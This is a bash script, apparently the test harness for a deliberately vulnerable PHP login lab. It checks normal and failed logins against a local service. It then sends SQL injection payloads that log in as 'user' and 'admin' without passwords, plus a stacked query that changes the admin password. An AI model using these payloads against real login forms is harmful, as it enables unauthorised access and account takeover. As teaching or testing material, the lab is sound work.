#!/bin/bash

set -e

function send()
{
  >&2 echo -e "\nSending POST data: \e[34m $1 \e[0m"

  curl -sL -X POST http://php/index.php \
       -d "$1" | tr -d "\n"
}

function is_web_server_available()
{
    ! curl -s http://php/index.php 2>&1 | \
        grep 'Database connection failed' >/dev/null
}

until is_web_server_available
do
    echo -e '\e[90mWeb server still starting and not available...\e[0m'
    sleep 1
done

# The mariadb-fixtures-loader service is probably running now.
# (Yes, this is a crappy fix for a possible race condition)
sleep 1

send "name=user&pwd=password" | \
    grep 'Welcome user' >/dev/null

echo -e "\e[32mLegal and successful login as a standard user.\e[0m"

sleep 0.5

send "name=foo&pwd=bar" | \
    grep 'Wrong username / password' >/dev/null

echo -e "\e[32mFailed login with a bad password.\e[0m"

sleep 0.5

send "pwd=dummy&name=' OR username='user' -- " | \
    grep 'Welcome user' >/dev/null

echo -e "\e[31mPwn3d, logged in as an user without password!\e[0m"

sleep 0.5

send "pwd=dummy&name=' OR username='admin' -- " | \
    grep 'Welcome admin' >/dev/null

echo -e "\e[31mPwn3d, logged in as an admin without password!\e[0m"

sleep 0.5

send "pwd=dummy&name=' OR username='admin'; UPDATE users SET password='pwn3dpassword' WHERE username='admin'; -- " | \
    grep 'Welcome admin' >/dev/null

send "pwd=pwn3dpassword&name=admin" | \
    grep 'Welcome admin' >/dev/null

echo -e "\e[31mPwn3d, admin password changed to 'pwedpassword'!\e[0m"
